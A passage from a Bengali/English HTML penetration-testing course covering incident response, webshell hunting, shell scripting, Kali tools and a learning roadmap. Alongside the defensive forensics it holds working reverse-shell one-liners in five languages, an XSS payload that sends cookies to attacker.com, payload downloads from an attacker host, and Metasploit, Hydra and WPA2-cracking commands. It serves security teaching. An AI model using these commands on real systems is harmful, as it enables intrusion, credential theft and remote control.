+journalctl -xe                         <span class="c"># systemd log</span>
+journalctl -u sshd --since "1 hour ago"
+journalctl --since "2024-01-01 00:00" --until "2024-01-02 00:00"
+
+<span class="c"># Web server log</span>
+tail -f /var/log/apache2/access.log
+tail -f /var/log/nginx/access.log
+
+<span class="c"># Login history</span>
+last                    <span class="c"># সফল login history</span>
+lastb                   <span class="c"># ব্যর্থ login (root লাগতে পারে)</span>
+lastlog                 <span class="c"># সব user-এর শেষ login</span>
+who                     <span class="c"># বর্তমানে login করা user</span>
+
+<span class="c"># Log বিশ্লেষণ</span>
+<span class="c"># Top 10 IP by request:</span>
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10
+<span class="c"># 404 error count by IP:</span>
+awk '$9=="404" {print $1}' access.log | sort | uniq -c | sort -rn
+<span class="c"># Brute force detect:</span>
+grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+    </div>
+
+    <h2 class="sec">Incident Response — আক্রান্ত সিস্টেমে কী করবে?</h2>
+    <div class="code">
+<span class="c"># ১. কে login আছে?</span>
+who
+w
+last | head -20
+
+<span class="c"># ২. অস্বাভাবিক প্রসেস</span>
+ps aux --sort=-%cpu | head -20
+ps aux --sort=-%mem | head -20
+ps aux | grep -E "(nc|netcat|bash -i|python -c)"
+
+<span class="c"># ৩. নেটওয়ার্ক সংযোগ</span>
+netstat -tulnp
+ss -tulnp
+lsof -i TCP -n | grep ESTABLISHED
+
+<span class="c"># ৪. সাম্প্রতিক পরিবর্তিত ফাইল</span>
+find / -mtime -1 -type f 2>/dev/null | grep -v "/proc\|/sys"
+find /var/www -mtime -7 -name "*.php" 2>/dev/null
+
+<span class="c"># ৫. Cron job চেক</span>
+crontab -l -u root
+cat /etc/crontab
+ls -la /etc/cron*
+
+<span class="c"># ৬. Startup script চেক</span>
+ls -la /etc/init.d/
+systemctl list-units --type=service
+ls -la /etc/rc*.d/
+
+<span class="c"># ৭. SUID file চেক</span>
+find / -perm -4000 -type f 2>/dev/null > /tmp/suid_check.txt
+diff /tmp/suid_check.txt /tmp/suid_baseline.txt  <span class="c"># নতুন SUID?</span>
+
+<span class="c"># ৮. Hidden ফাইল/ডিরেক্টরি</span>
+find / -name ".*" -type f 2>/dev/null | grep -v ".cache\|.config"
+ls -la /tmp/ /var/tmp/ /dev/shm/
+
+<span class="c"># ৯. User account চেক</span>
+awk -F: '$3 == 0 {print $1}' /etc/passwd  <span class="c"># UID 0 user</span>
+awk -F: 'length($2) > 0 && $2 != "x" {print $1}' /etc/passwd  <span class="c"># Direct hash</span>
+
+<span class="c"># ১০. SSH authorized keys</span>
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+find / -name "authorized_keys" 2>/dev/null
+    </div>
+
+    <h2 class="sec">Webshell খোঁজা</h2>
+    <div class="code">
+<span class="c"># সন্দেহজনক PHP ফাইল খোঁজা</span>
+find /var/www -name "*.php" -type f -mtime -7
+grep -r "eval\|base64_decode\|system\|exec\|passthru\|shell_exec\|popen" /var/www/ --include="*.php"
+grep -r "\$_GET\|\$_POST\|\$_REQUEST" /var/www/ --include="*.php" | grep -i "eval\|system"
+
+<span class="c"># Yara দিয়ে webshell scan</span>
+yara webshell_rules.yar /var/www/
+
+<span class="c"># Base64 encoded code</span>
+grep -r "base64_decode" /var/www/ --include="*.php"
+    </div>
+
+    <h2 class="sec">Memory ও Disk Forensics</h2>
+    <div class="code">
+<span class="c"># Memory dump</span>
+apt install lime-forensics
+insmod lime.ko "path=/tmp/memory.lime format=lime"
+
+<span class="c"># Volatility দিয়ে memory বিশ্লেষণ</span>
+volatility -f memory.lime --profile=Linux imageinfo
+volatility -f memory.lime --profile=LinuxUbuntu pstree
+volatility -f memory.lime --profile=LinuxUbuntu linux_netstat
+
+<span class="c"># Disk Image তৈরি</span>
+dd if=/dev/sda of=/external/disk.img bs=4096
+
+<span class="c"># Autopsy দিয়ে বিশ্লেষণ</span>
+autopsy    <span class="c"># GUI tool</span>
+
+<span class="c"># File Carving — মুছে যাওয়া ফাইল পুনরুদ্ধার</span>
+photorec disk.img                   <span class="c"># Image/Video recover</span>
+foremost -i disk.img -o /output/    <span class="c"># File carving</span>
+scalpel disk.img -o /output/        <span class="c"># Advanced carving</span>
+
+<span class="c"># Metadata বিশ্লেষণ</span>
+exiftool suspicious_file.jpg        <span class="c"># Image metadata</span>
+strings malware.bin | head -50      <span class="c"># Printable strings</span>
+xxd malware.bin | head -20          <span class="c"># Hex dump</span>
+file malware.bin                    <span class="c"># ফাইল ধরন</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 11: Shell Scripting
+════════════════════════════════════════ -->
+<div class="chapter ch11">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 11</div>
+    <div class="chapter-title"><span class="bn-text">📜 Shell Scripting for Security</span><span class="en-text">📜 Shell Scripting for Security</span></div>
+    <div class="chapter-desc"><span class="bn-text">Automation, Reverse Shell ও Security Scripts</span><span class="en-text">Automation, Reverse Shell & Security Scripts</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Bash Scripting মূল ধারণা</h2>
+    <div class="code">
+#!/bin/bash                          <span class="c"># Shebang — bash দিয়ে চালাও</span>
+
+<span class="c"># Variable</span>
+name="saimum"
+age=20
+echo "নাম: $name, বয়স: $age"
+
+<span class="c"># User input</span>
+read -p "IP address: " ip
+echo "স্ক্যান করছি: $ip"
+
+<span class="c"># Condition</span>
+if [ -f "/etc/shadow" ]; then
+    echo "shadow file exists"
+elif [ -d "/var/www" ]; then
+    echo "web server আছে"
+else
+    echo "কিছুই নেই"
+fi
+
+<span class="c"># Loop</span>
+for i in {1..254}; do
+    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"
+done
+
+<span class="c"># While loop</span>
+while true; do
+    nc -lvnp 4444
+    sleep 5
+done
+
+<span class="c"># Function</span>
+scan_host() {
+    echo "Scanning: $1"
+    nmap -sV $1
+}
+scan_host 192.168.1.1
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Security Automation Scripts</span><span class="en-text">Security Automation Scripts</span></h2>
+    <h3 class="sub">Host Discovery Script</h3>
+    <div class="code">
+#!/bin/bash
+<span class="c"># Network-এর সব active host খোঁজা</span>
+NETWORK="192.168.1"
+echo "[*] Scanning $NETWORK.0/24..."
+
+for i in $(seq 1 254); do
+    {
+        ping -c 1 -W 1 $NETWORK.$i &>/dev/null
+        if [ $? -eq 0 ]; then
+            hostname=$(nslookup $NETWORK.$i 2>/dev/null | awk '/name = / {print $4}')
+            echo "[+] $NETWORK.$i UP - $hostname"
+        fi
+    } &
+done
+wait
+echo "[*] Scan complete"
+    </div>
+
+    <h3 class="sub">Log Monitoring Script</h3>
+    <div class="code">
+#!/bin/bash
+<span class="c"># SSH Brute Force detect করা</span>
+LOGFILE="/var/log/auth.log"
+THRESHOLD=10
+
+echo "[*] Brute Force Detection চলছে..."
+grep "Failed password" $LOGFILE | \
+    awk '{print $(NF-3)}' | \
+    sort | uniq -c | sort -rn | \
+    while read count ip; do
+        if [ $count -gt $THRESHOLD ]; then
+            echo "[!] ALERT: $ip থেকে $count ব্যর্থ login!"
+            echo "[*] Blocking $ip..."
+            iptables -A INPUT -s $ip -j DROP
+        fi
+    done
+    </div>
+
+    <h3 class="sub">Privilege Escalation Check Script</h3>
+    <div class="code">
+#!/bin/bash
+echo "=== Privilege Escalation Check ==="
+
+echo "[*] Current User:"
+id; whoami
+
+echo "[*] Sudo Permissions:"
+sudo -l 2>/dev/null
+
+echo "[*] SUID Files:"
+find / -perm -4000 -type f 2>/dev/null
+
+echo "[*] Writable /etc files:"
+find /etc -writable -type f 2>/dev/null
+
+echo "[*] Cron Jobs:"
+cat /etc/crontab 2>/dev/null
+ls /etc/cron.d/ 2>/dev/null
+
+echo "[*] Interesting files:"
+find / -name "*.conf" -exec grep -li "password" {} \; 2>/dev/null | head -10
+    </div>
+
+    <h2 class="sec">Reverse Shell — সব পদ্ধতি</h2>
+    <div class="code">
+<span class="c"># ⭐ Bash Reverse Shell</span>
+bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
+
+<span class="c"># Python Reverse Shell</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+<span class="c"># Netcat Reverse Shell</span>
+nc -e /bin/bash 10.10.14.1 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
+
+<span class="c"># PHP Reverse Shell</span>
+php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+<span class="c"># Perl Reverse Shell</span>
+perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+
+<span class="c"># ⭐ Shell Upgrade (fully interactive)</span>
+<span class="c"># Attacker-এ:</span>
+nc -lvnp 4444
+<span class="c"># Reverse shell পাওয়ার পর:</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># Ctrl+Z</span>
+stty raw -echo; fg
+<span class="c"># Enter দুইবার</span>
+export TERM=xterm
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 12: Kali Linux Tools
+════════════════════════════════════════ -->
+<div class="chapter ch12">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 12</div>
+    <div class="chapter-title"><span class="bn-text">🗡️ Kali Linux — সম্পূর্ণ টুল গাইড</span><span class="en-text">🗡️ Kali Linux — Complete Tools Guide</span></div>
+    <div class="chapter-desc"><span class="bn-text">Reconnaissance থেকে Post-Exploitation — সব টুল</span><span class="en-text">From Reconnaissance to Post-Exploitation — All Tools</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Phase 1: Reconnaissance (তথ্য সংগ্রহ)</h2>
+    <div class="code">
+<span class="c"># Passive Recon</span>
+whois target.com                          <span class="c"># Domain info</span>
+dig target.com ANY                        <span class="c"># DNS records</span>
+dnsenum target.com                        <span class="c"># DNS enumeration</span>
+dnsrecon -d target.com                    <span class="c"># Detailed DNS</span>
+theHarvester -d target.com -b all        <span class="c"># Email, subdomain</span>
+subfinder -d target.com                  <span class="c"># Subdomain discovery</span>
+amass enum -d target.com                 <span class="c"># Asset discovery</span>
+fierce --domain target.com               <span class="c"># DNS brute force</span>
+
+<span class="c"># OSINT</span>
+recon-ng                                  <span class="c"># OSINT framework</span>
+maltego                                   <span class="c"># Link analysis (GUI)</span>
+shodan search "apache city:Dhaka"        <span class="c"># IoT search</span>
+    </div>
+
+    <h2 class="sec">Phase 2: Scanning</h2>
+    <div class="code">
+<span class="c"># Nmap — সবচেয়ে গুরুত্বপূর্ণ</span>
+nmap -sn 192.168.1.0/24              <span class="c"># Host discovery</span>
+nmap -sS -p- target.com              <span class="c"># Stealth full scan</span>
+nmap -sV -sC target.com              <span class="c"># Service + Default scripts</span>
+nmap -A -T4 target.com               <span class="c"># Aggressive scan</span>
+nmap -sU target.com                  <span class="c"># UDP scan</span>
+nmap --script vuln target.com        <span class="c"># Vulnerability scan</span>
+nmap --script=smb-vuln* target.com   <span class="c"># SMB vulnerabilities</span>
+nmap -oN result.txt target.com       <span class="c"># Output to file</span>
+
+<span class="c"># Vulnerability Scanners</span>
+nikto -h http://target.com           <span class="c"># Web server scan</span>
+nuclei -u https://target.com         <span class="c"># Template-based scan</span>
+openvas                              <span class="c"># Full vulnerability scanner</span>
+
+<span class="c"># Directory Brute Force</span>
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+dirb http://target.com
+feroxbuster -u http://target.com -w wordlist.txt
+
+<span class="c"># Subdomain Brute Force</span>
+gobuster dns -d target.com -w subdomains.txt
+    </div>
+
+    <h2 class="sec">Phase 3: Exploitation</h2>
+
+    <h3 class="sub">Metasploit Framework — সবচেয়ে গুরুত্বপূর্ণ</h3>
+    <div class="code">
+<span class="c"># Metasploit শুরু</span>
+msfdb init              <span class="c"># Database setup</span>
+msfconsole              <span class="c"># Metasploit শুরু</span>
+
+<span class="c"># মৌলিক কমান্ড</span>
+help                    <span class="c"># সাহায্য</span>
+search eternalblue      <span class="c"># Exploit খোঁজা</span>
+use exploit/windows/smb/ms17_010_eternalblue   <span class="c"># Module নির্বাচন</span>
+info                    <span class="c"># Module তথ্য</span>
+show options            <span class="c"># Configure করতে হবে কী কী</span>
+set RHOSTS 192.168.1.100          <span class="c"># Target IP</span>
+set LHOST 192.168.1.50            <span class="c"># আমার IP</span>
+set LPORT 4444                    <span class="c"># আমার পোর্ট</span>
+set payload windows/x64/meterpreter/reverse_tcp
+show payloads           <span class="c"># সব payload</span>
+run                     <span class="c"># চালাও!</span>
+exploit                 <span class="c"># একই কাজ</span>
+
+<span class="c"># Meterpreter — post-exploitation shell</span>
+sysinfo                 <span class="c"># সিস্টেম তথ্য</span>
+getuid                  <span class="c"># বর্তমান user</span>
+getsystem               <span class="c"># Privilege escalation চেষ্টা</span>
+hashdump                <span class="c"># Password hashes বের করো</span>
+shell                   <span class="c"># System shell</span>
+upload file.txt /tmp/   <span class="c"># ফাইল upload</span>
+download /etc/passwd ./ <span class="c"># ফাইল download</span>
+screenshot              <span class="c"># Screenshot</span>
+keyscan_start           <span class="c"># Keylogger</span>
+run post/multi/recon/local_exploit_suggester  <span class="c"># PrivEsc suggestion</span>
+background              <span class="c"># Session background</span>
+sessions -l             <span class="c"># সব session</span>
+sessions -i 1           <span class="c"># Session 1-এ ফিরে যাও</span>
+    </div>
+
+    <h2 class="sec">Phase 4: <span class="bn-text">Web Application Testing</span><span class="en-text">Web Application Testing</span></h2>
+    <div class="code">
+<span class="c"># Burp Suite (GUI) — সবচেয়ে গুরুত্বপূর্ণ</span>
+burpsuite &             <span class="c"># Background-এ চালু</span>
+<span class="c"># Browser proxy: 127.0.0.1:8080</span>
+
+<span class="c"># SQLmap — SQL Injection</span>
+sqlmap -u "http://target.com/page?id=1"
+sqlmap -u "http://target.com/page?id=1" --dbs     <span class="c"># Database list</span>
+sqlmap -u "http://target.com/page?id=1" -D testdb --tables
+sqlmap -u "http://target.com/page?id=1" -D testdb -T users --dump
+sqlmap -r request.txt   <span class="c"># Burp request থেকে</span>
+sqlmap -u "..." --os-shell  <span class="c"># OS shell পাওয়া</span>
+
+<span class="c"># XSS Testing</span>
+<span class="c"># Payload:</span>
+<span class="g">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="g">&lt;img src=x onerror=alert(document.cookie)&gt;</span>
+<span class="g">&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="c"># OWASP ZAP — Automated scanner</span>
+zaproxy &
+    </div>
+
+    <h2 class="sec">Phase 5: Password Attacks</h2>
+    <div class="code">
+<span class="c"># Hydra — Online Brute Force</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+hydra -L users.txt -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+hydra -l admin -P rockyou.txt ftp://192.168.1.100
+hydra -l user -P rockyou.txt rdp://192.168.1.100
+
+<span class="c"># John the Ripper</span>
+john hash.txt                              <span class="c"># Auto detect</span>
+john --wordlist=rockyou.txt hash.txt       <span class="c"># Dictionary</span>
+john --rules hash.txt                      <span class="c"># Rules apply</span>
+john --show hash.txt                       <span class="c"># Cracked password দেখা</span>
+unshadow /etc/passwd /etc/shadow > crack.txt && john crack.txt
+
+<span class="c"># Hashcat — GPU-based</span>
+hashcat -m 0 hash.txt rockyou.txt          <span class="c"># MD5</span>
+hashcat -m 1000 hash.txt rockyou.txt       <span class="c"># NTLM (Windows)</span>
+hashcat -m 1800 hash.txt rockyou.txt       <span class="c"># SHA-512 (Linux)</span>
+hashcat -m 22000 handshake.hc22000 rockyou.txt  <span class="c"># WPA2</span>
+hashcat -a 3 hash.txt ?a?a?a?a?a?a        <span class="c"># Brute force mask</span>
+
+<span class="c"># Wordlist</span>
+ls /usr/share/wordlists/
+gunzip /usr/share/wordlists/rockyou.txt.gz <span class="c"># Decompress</span>
+crunch 8 10 abc123 -o wordlist.txt         <span class="c"># Custom wordlist</span>
+    </div>
+
+    <h2 class="sec">Phase 6: Wireless Attacks</h2>
+    <div class="code">
+<span class="c"># Monitor Mode চালু</span>
+airmon-ng check kill        <span class="c"># Conflicting process বন্ধ</span>
+airmon-ng start wlan0       <span class="c"># Monitor mode</span>
+iwconfig wlan0mon           <span class="c"># Confirm</span>
+
+<span class="c"># WiFi স্ক্যান</span>
+airodump-ng wlan0mon        <span class="c"># সব নেটওয়ার্ক দেখা</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon   <span class="c"># Target</span>
+
+<span class="c"># Deauth Attack + Handshake Capture</span>
+aireplay-ng --deauth 100 -a [BSSID] wlan0mon    <span class="c"># Deauth</span>
+<span class="c"># Handshake capture হলে airodump-ng-তে দেখাবে</span>
+
+<span class="c"># WPA2 Crack</span>
+aircrack-ng -w rockyou.txt capture.cap
+hashcat -m 22000 capture.hc22000 rockyou.txt
+
+<span class="c"># Monitor Mode বন্ধ</span>
+airmon-ng stop wlan0mon
+    </div>
+
+    <h2 class="sec">গুরুত্বপূর্ণ Wordlist ও Payload</h2>
+    <table>
+      <thead><tr><th>ফাইল/টুল</th><th>অবস্থান</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>rockyou.txt</td><td>/usr/share/wordlists/rockyou.txt.gz</td><td>পাসওয়ার্ড ক্র্যাক</td></tr>
+        <tr><td>dirbuster wordlist</td><td>/usr/share/wordlists/dirbuster/</td><td>Directory brute force</td></tr>
+        <tr><td>SecLists</td><td>/usr/share/seclists/ (ইনস্টল করতে হবে)</td><td>সব ধরনের wordlist</td></tr>
+        <tr><td>webshells</td><td>/usr/share/webshells/</td><td>PHP/ASP webshell</td></tr>
+        <tr><td>nmap scripts</td><td>/usr/share/nmap/scripts/</td><td>NSE scripts</td></tr>
+        <tr><td>Metasploit modules</td><td>/usr/share/metasploit-framework/modules/</td><td>Exploit modules</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">File Transfer — Victim থেকে/আমার কাছে</h2>
+    <div class="code">
+<span class="c"># Python HTTP Server (Attacker-এ)</span>
+python3 -m http.server 8080
+<span class="c"># Victim-এ download:</span>
+wget http://attacker.com:8080/linpeas.sh
+curl http://attacker.com:8080/shell.php -o /var/www/html/shell.php
+
+<span class="c"># SCP (SSH Copy)</span>
+scp user@victim:/etc/passwd ./     <span class="c"># Victim থেকে ডাউনলোড</span>
+scp ./shell.php user@victim:/tmp/  <span class="c"># Victim-এ upload</span>
+
+<span class="c"># Base64 দিয়ে Transfer (Firewall bypass)</span>
+<span class="c"># Attacker:</span>
+base64 linpeas.sh                  <span class="c"># Encode করো</span>
+<span class="c"># Victim:</span>
+echo "BASE64DATA..." | base64 -d > linpeas.sh && bash linpeas.sh
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎯 সারসংক্ষেপ — Pentest Methodology</h3>
+      <ul>
+        <li>✅ Reconnaissance → Nmap, theHarvester, subfinder</li>
+        <li>✅ Scanning → Nikto, Nmap scripts, Gobuster</li>
+        <li>✅ Exploitation → Metasploit, SQLmap, Manual</li>
+        <li>✅ Post-Exploitation → Meterpreter, LinPEAS</li>
+        <li>✅ Privilege Escalation → sudo -l, SUID, Cron</li>
+        <li>✅ Persistence → Cron, Systemd service, Authorized keys</li>
+        <li>✅ Covering Tracks → Log মুছা, History পরিষ্কার</li>
+      </ul>
+    </div>
+
+    <div class="box success" style="margin-top:40px;">
+      <div class="box-t">🚀 পরবর্তী পদক্ষেপ</div>
+      <strong>TryHackMe</strong> — "Jr Penetration Tester" Path দিয়ে শুরু করো। তারপর <strong>HackTheBox</strong>-এ Easy Linux machine থেকে শুরু করো। সব কিছু Linux-এ হাতে-কলমে প্র্যাকটিস করতে হবে — শুধু পড়লে হবে না।
+    </div>
+
+    <div style="text-align:center; margin-top:50px; padding:30px; background:#0d1b2a; border-radius:12px; color:rgba(255,255,255,0.7);">
+      <p style="font-size:18px; color:#2dc653; margin-bottom:10px;">🐧 "In the world of Linux, the terminal is your superpower."</p>
+      <p><span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে।</span><span class="en-text">This document is entirely for educational purposes.</span></p>
+      <p><span class="bn-text">সব সময় authorized environment-এ প্র্যাকটিস করো।</span><span class="en-text">Always practice in an authorized environment.</span></p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 13: Roadmap / Learning Path
+════════════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="chapter-header" style="background:linear-gradient(135deg,#0d2818,#1a4731);">
+    <div class="chapter-label">CHAPTER 13</div>
+    <div class="chapter-title">🗺️ <span class="bn-text">সাইবার সিকিউরিটি Roadmap</span><span class="en-text">Cybersecurity Learning Roadmap</span></div>
+    <div class="chapter-desc"><span class="bn-text">শূন্য থেকে Professional হওয়ার সম্পূর্ণ পথ</span><span class="en-text">Complete path from zero to professional</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box info">
+      <div class="box-t">💡 <span class="bn-text">কীভাবে পড়বে এই Roadmap?</span><span class="en-text">How to read this roadmap?</span></div>
+      <span class="bn-text">নিচের প্রতিটি Phase ক্রমানুসারে সম্পন্ন করো। প্রতিটি Phase শেষ করতে গড়ে ১-৩ মাস লাগবে।</span>
+      <span class="en-text">Complete each phase below in order. Each phase takes approximately 1-3 months on average.</span>
+    </div>
+
+    <div class="roadmap-container">
+
+      <!-- Phase 1 -->
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#0077b6,#00b4d8);">1</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#0077b6;">
+            🐧 <span class="bn-text">Phase 1 — Linux ও Networking ভিত্তি</span><span class="en-text">Phase 1 — Linux & Networking Fundamentals</span>
+            <span class="badge badge-b" style="font-size:11px; margin-left:8px;">1-2 মাস / 1-2 months</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">সাইবার সিকিউরিটির ভিত্তি। এখানে দুর্বলতা থাকলে বাকি সব কঠিন হয়।</span><span class="en-text">The foundation of cybersecurity. Without this base, everything else becomes harder.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#0077b6;">Linux Basic Commands</span>
+            <span class="phase-item" style="color:#0077b6;">File System & Permissions</span>
+            <span class="phase-item" style="color:#0077b6;">Bash Scripting</span>
+            <span class="phase-item" style="color:#0077b6;">TCP/IP Model</span>
+            <span class="phase-item" style="color:#0077b6;">DNS, HTTP, SSH</span>
+            <span class="phase-item" style="color:#0077b6;">Wireshark Basics</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <!-- Phase 2 -->
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#2dc653,#06a94d);">2</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#06a94d;">
+            🔐 <span class="bn-text">Phase 2 — সিকিউরিটি মূল ধারণা</span><span class="en-text">Phase 2 — Core Security Concepts</span>
+            <span class="badge badge-g" style="font-size:11px; margin-left:8px;">1-2 মাস / 1-2 months</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">কীভাবে সিস্টেম secure করতে হয় এবং কোথায় দুর্বলতা থাকে।</span><span class="en-text">How to secure systems and where vulnerabilities exist.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#06a94d;">Cryptography Basics</span>
+            <span class="phase-item" style="color:#06a94d;">User & Access Control</span>
+            <span class="phase-item" style="color:#06a94d;">Firewall & iptables</span>
+            <span class="phase-item" style="color:#06a94d;">Log Analysis</span>
+            <span class="phase-item" style="color:#06a94d;">SSH Hardening</span>
+            <span class="phase-item" style="color:#06a94d;">CVE & Vulnerability Basics</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <!-- Phase 3 -->
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#f4831f,#e63946);">3</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#e63946;">
+            🗡️ <span class="bn-text">Phase 3 — Ethical Hacking শুরু</span><span class="en-text">Phase 3 — Start Ethical Hacking</span>
+            <span class="badge badge-r" style="font-size:11px; margin-left:8px;">2-3 মাস / 2-3 months</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">Attacker-এর মতো চিন্তা করতে শেখো। Kali Linux দিয়ে হাতে-কলমে।</span><span class="en-text">Learn to think like an attacker. Hands-on with Kali Linux.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#e63946;">Kali Linux Setup</span>
+            <span class="phase-item" style="color:#e63946;">Nmap & Scanning</span>
+            <span class="phase-item" style="color:#e63946;">Metasploit Framework</span>
+            <span class="phase-item" style="color:#e63946;">Web Hacking Basics</span>
+            <span class="phase-item" style="color:#e63946;">SQLi & XSS</span>
+            <span class="phase-item" style="color:#e63946;">Password Attacks</span>
+            <span class="phase-item" style="color:#e63946;">TryHackMe — Easy Rooms</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <!-- Phase 4 -->
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#7b2d8b,#a855f7);">4</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#7b2d8b;">
+            ⬆️ <span class="bn-text">Phase 4 — Advanced Techniques</span><span class="en-text">Phase 4 — Advanced Techniques</span>
+            <span class="badge badge-p" style="font-size:11px; margin-left:8px;">2-4 মাস / 2-4 months</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">Privilege Escalation, Forensics, Scripting — পেশাদার স্তরে।</span><span class="en-text">Privilege Escalation, Forensics, Scripting — at a professional level.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#7b2d8b;">Linux PrivEsc</span>
+            <span class="phase-item" style="color:#7b2d8b;">Windows PrivEsc</span>
+            <span class="phase-item" style="color:#7b2d8b;">Active Directory</span>
+            <span class="phase-item" style="color:#7b2d8b;">Digital Forensics</span>
+            <span class="phase-item" style="color:#7b2d8b;">Python Scripting</span>
+            <span class="phase-item" style="color:#7b2d8b;">HackTheBox — Easy</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <!-- Phase 5 -->
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#ffd60a,#f4831f);">5</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#b45309;">
+            🏆 <span class="bn-text">Phase 5 — Certification ও Career</span><span class="en-text">Phase 5 — Certifications & Career</span>
+            <span class="badge badge-y" style="font-size:11px; margin-left:8px;">চলমান / Ongoing</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">Certification নিয়ে professional career শুরু করো।</span><span class="en-text">Start your professional career with certifications.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#b45309;">eJPT (শুরু করার জন্য)</span>
+            <span class="phase-item" style="color:#b45309;">CompTIA Security+</span>
+            <span class="phase-item" style="color:#b45309;">CEH</span>
+            <span class="phase-item" style="color:#b45309;">OSCP (লক্ষ্য)</span>
+            <span class="phase-item" style="color:#b45309;">Bug Bounty</span>
+            <span class="phase-item" style="color:#b45309;">CTF Competitions</span>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- end roadmap-container -->
+
+    <h2 class="sec">🌐 <span class="bn-text">Platform ও সম্পদ</span><span class="en-text">Platforms & Resources</span></h2>
+    <table>
+      <thead><tr>
+        <th>Platform</th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">কার জন্য</span><span class="en-text">For Whom</span></th>
+        <th><span class="bn-text">খরচ</span><span class="en-text">Cost</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>TryHackMe</strong></td><td>Guided Learning</td><td><span class="bn-text">একদম নতুনদের জন্য</span><span class="en-text">Complete beginners</span></td><td>Free + Premium</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td>CTF / Labs</td><td><span class="bn-text">মাঝারি ও এগিয়ে যাওয়া</span><span class="en-text">Intermediate & advanced</span></td><td>Free + VIP</td></tr>
+        <tr><td><strong>PortSwigger Web Academy</strong></td><td>Web Hacking</td><td><span class="bn-text">Web security শিখতে</span><span class="en-text">For web security</span></td><td>Free</td></tr>
+        <tr><td><strong>PicoCTF</strong></td><td>CTF</td><td><span class="bn-text">শিক্ষার্থীদের জন্য</span><span class="en-text">For students</span></td><td>Free</td></tr>
+        <tr><td><strong>VulnHub</strong></td><td>VMs</td><td><span class="bn-text">Offline practice</span><span class="en-text">Offline practice</span></td><td>Free</td></tr>
+        <tr><td><strong>OWASP</strong></td><td>Web Standard</td><td><span class="bn-text">Web security reference</span><span class="en-text">Web security reference</span></td><td>Free</td></tr>
+        <tr><td><strong>Exploit-DB</strong></td><td>Exploit DB</td><td><span class="bn-text">CVE ও exploit খোঁজা</span><span class="en-text">Find CVEs and exploits</span></td><td>Free</td></tr>
+        <tr><td><strong>GTFOBins</strong></td><td>PrivEsc Reference</td><td><span class="bn-text">Linux PrivEsc</span><span class="en-text">Linux PrivEsc</span></td><td>Free</td></tr>
